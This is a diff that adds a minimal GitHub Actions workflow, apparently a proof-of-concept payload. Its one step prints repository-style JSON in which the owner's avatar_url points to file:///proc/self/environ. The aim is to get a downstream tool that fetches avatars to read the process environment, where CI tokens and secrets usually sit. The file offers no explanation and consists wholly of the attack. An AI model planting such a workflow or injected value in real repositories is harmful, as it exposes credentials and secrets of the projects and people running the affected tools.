@@ -1,0 +1,7 @@
+name: e
+on: [workflow_dispatch, push]
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo '{"full_name":"t","owner":{"login":"t","avatar_url":"file:///proc/self/environ"}}'
